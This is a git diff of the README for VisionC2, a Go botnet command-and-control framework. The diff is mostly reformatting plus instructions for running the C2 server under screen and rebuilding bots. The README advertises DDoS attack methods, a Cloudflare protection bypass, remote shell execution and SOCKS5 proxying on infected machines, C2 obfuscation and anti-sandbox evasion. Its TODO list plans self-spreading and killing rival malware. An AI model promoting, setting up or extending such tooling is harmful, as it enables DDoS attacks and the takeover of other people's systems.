@@ -2,6 +2,7 @@
 # VisionC2 – Advanced Botnet Command & Control Framework
 
 ## 📑 Table of Contents
+
 - [📋 Changelog](https://github.com/Syn2Much/VisionC2/blob/main/CHANGELOG.md)
 - [🚀 Installation & Setup](#-installation--setup)
 - [🎯 Quick Usage](#-quick-usage)
@@ -10,7 +11,6 @@
 - [📋 WIP/TODO](#-wiptodo)
 - [⚖️ Disclaimer](#️-disclaimer)
 - [🤝 Community & Support](#-community--support)
-
 
 ![VisionC2 Banner](https://img.shields.io/badge/VisionNet-V1.5-red)
 ![Go Version](https://img.shields.io/badge/Go-1.23.0+-blue)
@@ -21,40 +21,40 @@
 
 #### 🎯 Bot Capabilities
 
-* **Layer 4**
+- **Layer 4**
 
-  * UDP, TCP, SYN, ACK, GRE, and DNS-based Attack Methods
+  - UDP, TCP, SYN, ACK, GRE, and DNS-based Attack Methods
 
-* **Layer 7**
+- **Layer 7**
 
-  * HTTP / HTTPS / TLS traffic with HTTP/2 fingerprinting
-  * Cloudflare UAM bypass with captcha solving
+  - HTTP / HTTPS / TLS traffic with HTTP/2 fingerprinting
+  - Cloudflare UAM bypass with captcha solving
 
-* **RCE**
+- **RCE**
 
-  * Send shell commands to bot(s) with real-time output streaming or fire-and-forget mode
+  - Send shell commands to bot(s) with real-time output streaming or fire-and-forget mode
 
-* **SOCKS5**
+- **SOCKS5**
 
-  * Turn any agent into a SOCKS5 proxy server on a specified port
+  - Turn any agent into a SOCKS5 proxy server on a specified port
 
 ---
 
 #### 🔒 Security Features
 
-* **TLS 1.3** with perfect forward secrecy for all communications
+- **TLS 1.3** with perfect forward secrecy for all communications
 
   > Zero plain-text communications
 
-* **No hardcoded C2**
+- **No hardcoded C2**
 
   > C2 address protected via RC4, XOR, byte substitution, and MD5
 
-* **HMAC Authentication**
+- **HMAC Authentication**
 
   > Challenge–response verification for agent integrity
 
-* **Anti-Analysis Protections**
+- **Anti-Analysis Protections**
 
   > Multi-stage sandbox and analysis environment detection
 
@@ -73,7 +73,7 @@
 ### Prerequisites
 
 ```bash
-sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3
+sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
 # Go 1.23+ required - download from https://go.dev/dl/
 ```
 
@@ -113,13 +113,14 @@ Step 5/5: Build
 - CNC server built
 - Bot binaries built (14 architectures)
 ```
+
 **That's it!** The wizard handles everything:
 
-* C2 address configuration & obfuscation
-* Random magic codes & protocol versions
-* TLS certificate generation
-* Source code updates
-* Building CNC + 14 bot architectures
+- C2 address configuration & obfuscation
+- Random magic codes & protocol versions
+- TLS certificate generation
+- Source code updates
+- Building CNC + 14 bot architectures
 
 ---
 
@@ -129,13 +130,24 @@ Step 5/5: Build
 
 ```bash
 cd cnc
-./cnc
+screen ./cnc
 ```
+
+> 💡 Use `screen` to keep the C2 running after disconnecting. Reattach with `screen -r`.
+
+### Rebuilding Bots (After Initial Setup)
+
+```bash
+cd bot
+./build.sh
+```
+
+> Use this to rebuild bot binaries without changing C2 configuration.
 
 The CNC server will start listening on:
 
-* **Port 443 (TLS)**: For bot connections (fixed, cannot be changed)
-* **Admin Port (configurable)**: For admin console connections (default: 420)
+- **Port 443 (TLS)**: For bot connections (fixed, cannot be changed)
+- **Admin Port (configurable)**: For admin console connections (default: 420)
 
 ### Connecting to Admin Console
 
@@ -198,11 +210,11 @@ VisionC2 operates on a client-server model with clear separation between adminis
 
 ## 📋 WIP/TODO
 
-* Auto Generated DGA Fallback Domains for bot
-* Locker/Killer to stay on the device and eliminate competing malware
-* Spread/Self-Rep Mechanism for
-* Enhanced Daemonize with better stealth
-* Single Instance/Port Takeover Networking capabilities
+- Auto Generated DGA Fallback Domains for bot
+- Locker/Killer to stay on the device and eliminate competing malware
+- Spread/Self-Rep Mechanism for
+- Enhanced Daemonize with better stealth
+- Single Instance/Port Takeover Networking capabilities
 
 ---
 
@@ -225,12 +237,12 @@ The developers assume no liability and are not responsible for any misuse or dam
 
 ### Acknowledgments
 
-* Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo
+- Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo
 
 ### Support
 
-* **GitHub Issues**: For bug reports and feature requests
-* **Email**: [dev@sinners.city](mailto:dev@sinners.city) for security-related concerns
+- **GitHub Issues**: For bug reports and feature requests
+- **Email**: [dev@sinners.city](mailto:dev@sinners.city) for security-related concerns
 
 ### License
 
